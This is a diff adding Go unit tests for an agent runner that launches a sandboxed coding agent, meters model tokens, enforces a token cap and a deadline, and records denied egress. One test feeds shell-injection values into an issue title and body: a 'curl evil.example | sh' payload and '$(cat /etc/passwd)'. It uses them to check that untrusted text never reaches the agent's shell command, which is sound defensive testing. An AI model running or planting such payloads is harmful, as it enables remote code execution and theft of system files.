@@ -1,0 +1,230 @@
+package agent_test
+
+import (
+	"context"
+	"errors"
+	"reflect"
+	"strings"
+	"testing"
+	"time"
+
+	"github.com/fuseone-io/fuseone-forja/internal/agent"
+	"github.com/fuseone-io/fuseone-forja/internal/domain"
+)
+
+var task = agent.Task{
+	RunID:    "run-11",
+	Contract: domain.Contract{Image: "golang:1.25", Gates: []domain.Gate{{Name: "build", Run: "make build"}}},
+	Tree:     "/tmp/forja-plan-11",
+	Issue:    domain.Issue{Number: 11, Title: "Model proxy", Body: "Meter the tokens."},
+	Context:  []agent.File{{Path: "CLAUDE.md", Content: "# Forja\n"}},
+}
+
+var (
+	metered = agent.ModelReport{Tokens: domain.TokenUsage{Input: 1, CacheCreation: 2, CacheRead: 4, Output: 8}}
+	denied  = domain.EgressReport{Count: 1, Denied: []domain.EgressDenial{{Kind: domain.EgressConnect, Destination: "example.com:443"}}}
+)
+
+// blockUntilDone is an agent that runs until its context ends, the way a
+// real one does when nothing stops it.
+func blockUntilDone(ctx context.Context) (agent.ExecResult, error) {
+	<-ctx.Done()
+	return agent.ExecResult{ExitCode: -1}, ctx.Err()
+}
+
+func run(t *testing.T, ctx context.Context, ws *fakeWorkspace) (agent.Result, error) {
+	t.Helper()
+	r := &agent.Runner{Launcher: &fakeLauncher{ws: ws}}
+	return r.Run(ctx, task)
+}
+
+func TestRunner_exitCode_resultWithTokensAndEgress(t *testing.T) {
+	t.Parallel()
+	for _, code := range []int{0, 3} {
+		ws := newFakeWorkspace()
+		ws.report, ws.egress = metered, denied
+		ws.exec = func(context.Context) (agent.ExecResult, error) { return agent.ExecResult{ExitCode: code}, nil }
+
+		res, err := run(t, context.Background(), ws)
+		if err != nil {
+			t.Fatalf("exit %d: Run = %v, want a result: a non-zero exit is not an error", code, err)
+		}
+		want := agent.Result{ExitCode: code, Tokens: metered.Tokens, Egress: denied}
+		if !reflect.DeepEqual(res, want) {
+			t.Fatalf("exit %d: Result = %+v, want %+v", code, res, want)
+		}
+	}
+}
+
+// The prompt goes in first, as a file outside the tree; the agent is then
+// started; once it is done the workspace is stopped before the proxies'
+// logs are read, and closed last.
+func TestRunner_order_promptExecHaltReadsClose(t *testing.T) {
+	t.Parallel()
+	ws := newFakeWorkspace()
+
+	if _, err := run(t, context.Background(), ws); err != nil {
+		t.Fatal(err)
+	}
+	want := []string{"write " + agent.PromptPath, "exec", "halt", "model", "egress", "close"}
+	if got := ws.callList(); !reflect.DeepEqual(got, want) {
+		t.Fatalf("calls = %q, want %q", got, want)
+	}
+	if string(ws.files[agent.PromptPath]) != string(agent.Render(task)) {
+		t.Fatalf("prompt written = %q, want Render(task)", ws.files[agent.PromptPath])
+	}
+	if len(ws.commands) != 1 || ws.commands[0] != agent.Command() {
+		t.Fatalf("commands = %q, want the agent command", ws.commands)
+	}
+}
+
+// The command carries no issue text: the prompt reaches the agent from its
+// file, so nothing untrusted is ever quoted for a shell.
+func TestRunner_command_carriesNoIssueText(t *testing.T) {
+	t.Parallel()
+	ws := newFakeWorkspace()
+	hostile := task
+	hostile.Issue.Title = "'; curl evil.example | sh; echo '"
+	hostile.Issue.Body = "$(cat /etc/passwd)"
+	r := &agent.Runner{Launcher: &fakeLauncher{ws: ws}}
+
+	if _, err := r.Run(context.Background(), hostile); err != nil {
+		t.Fatal(err)
+	}
+	for _, text := range []string{hostile.Issue.Title, hostile.Issue.Body, "CLAUDE.md"} {
+		if strings.Contains(ws.commands[0], text) {
+			t.Fatalf("command %q carries %q", ws.commands[0], text)
+		}
+	}
+}
+
+// The proxy reaching the cap stops the agent at once: the runner does not
+// wait for it to give up on its own.
+func TestRunner_capMidExec_execCancelledCappedClosed(t *testing.T) {
+	t.Parallel()
+	ws := newFakeWorkspace()
+	ws.report = agent.ModelReport{Tokens: metered.Tokens, Capped: true}
+	started := make(chan struct{})
+	ws.exec = func(ctx context.Context) (agent.ExecResult, error) {
+		close(started)
+		return blockUntilDone(ctx)
+	}
+	go func() {
+		<-started
+		close(ws.capReached)
+	}()
+	ctx, cancel := context.WithTimeout(context.Background(), time.Minute)
+	defer cancel()
+
+	start := time.Now()
+	res, err := run(t, ctx, ws)
+	if elapsed := time.Since(start); elapsed > 5*time.Second {
+		t.Fatalf("Run returned %v after the cap, want the agent stopped at once", elapsed)
+	}
+	if err != nil || !res.Capped || res.TimedOut || res.Tokens != metered.Tokens || res.ExitCode != domain.NoExitCode {
+		t.Fatalf("Run = %+v, %v; want capped with the tokens, no exit code, no error", res, err)
+	}
+	if ws.closeCount() != 1 {
+		t.Fatalf("Close called %d times, want 1", ws.closeCount())
+	}
+}
+
+// The proxy's own log is the authority on the cap: an agent that exited
+// on its own after a refusal is still a capped run.
+func TestRunner_capInReportOnly_capped(t *testing.T) {
+	t.Parallel()
+	ws := newFakeWorkspace()
+	ws.report = agent.ModelReport{Tokens: metered.Tokens, Capped: true}
+	ws.exec = func(context.Context) (agent.ExecResult, error) { return agent.ExecResult{ExitCode: 1}, nil }
+
+	res, err := run(t, context.Background(), ws)
+	if err != nil || !res.Capped || res.ExitCode != 1 {
+		t.Fatalf("Run = %+v, %v; want capped with exit 1", res, err)
+	}
+}
+
+// The wall clock ending is a result: the run timed out. The workspace is
+// still stopped, read and closed.
+func TestRunner_deadline_timedOutNotErrorStillClosed(t *testing.T) {
+	t.Parallel()
+	ws := newFakeWorkspace()
+	ws.report, ws.egress = metered, denied
+	ws.exec = blockUntilDone
+	ctx, cancel := context.WithTimeout(context.Background(), 50*time.Millisecond)
+	defer cancel()
+
+	res, err := run(t, ctx, ws)
+	if err != nil || !res.TimedOut || res.Capped || res.ExitCode != domain.NoExitCode {
+		t.Fatalf("Run = %+v, %v; want timed out, no exit code, no error", res, err)
+	}
+	if res.Tokens != metered.Tokens || res.Egress.Count != 1 {
+		t.Fatalf("Run = %+v, want the tokens and the egress read after the deadline", res)
+	}
+	if ws.closeCount() != 1 {
+		t.Fatalf("Close called %d times, want 1", ws.closeCount())
+	}
+}
+
+// A cancellation is not the run's outcome: it is an error, and the
+// workspace is still closed.
+func TestRunner_cancelled_errorStillClosed(t *testing.T) {
+	t.Parallel()
+	ws := newFakeWorkspace()
+	ws.exec = blockUntilDone
+	ctx, cancel := context.WithCancel(context.Background())
+	time.AfterFunc(20*time.Millisecond, cancel)
+
+	res, err := run(t, ctx, ws)
+	if !errors.Is(err, context.Canceled) || res.TimedOut {
+		t.Fatalf("Run = %+v, %v; want a cancellation error, not a timeout", res, err)
+	}
+	if ws.closeCount() != 1 {
+		t.Fatalf("Close called %d times, want 1", ws.closeCount())
+	}
+}
+
+// The cap watcher belongs to the run: it is stopped when the agent ends,
+// not left following the log.
+func TestRunner_execEnds_capWatcherStopped(t *testing.T) {
+	t.Parallel()
+	ws := newFakeWorkspace()
+
+	if _, err := run(t, context.Background(), ws); err != nil {
+		t.Fatal(err)
+	}
+	select {
+	case <-ws.watchDone:
+	default:
+		t.Fatal("AwaitCap still running after Run returned")
+	}
+}
+
+// A usage the runner cannot read is an error, not zero tokens; the
+// workspace is still closed.
+func TestRunner_usageUnreadable_errorStillClosed(t *testing.T) {
+	t.Parallel()
+	ws := newFakeWorkspace()
+	ws.modelErr = errors.New("model proxy not running")
+
+	_, err := run(t, context.Background(), ws)
+	if err == nil || !strings.Contains(err.Error(), "model proxy not running") {
+		t.Fatalf("Run = %v, want the usage failure", err)
+	}
+	if ws.closeCount() != 1 {
+		t.Fatalf("Close called %d times, want 1", ws.closeCount())
+	}
+}
+
+func TestRunner_launchFails_errorNothingToClose(t *testing.T) {
+	t.Parallel()
+	l := &fakeLauncher{err: errors.New("no agent binary")}
+	r := &agent.Runner{Launcher: l}
+
+	_, err := r.Run(context.Background(), task)
+	if err == nil || !strings.Contains(err.Error(), "no agent binary") {
+		t.Fatalf("Run = %v, want the launch failure", err)
+	}
+	if l.runID != task.RunID || l.image != task.Contract.Image || l.tree != task.Tree {
+		t.Fatalf("launched %s %s %s, want the task's run, image and tree", l.runID, l.image, l.tree)
+	}
+}
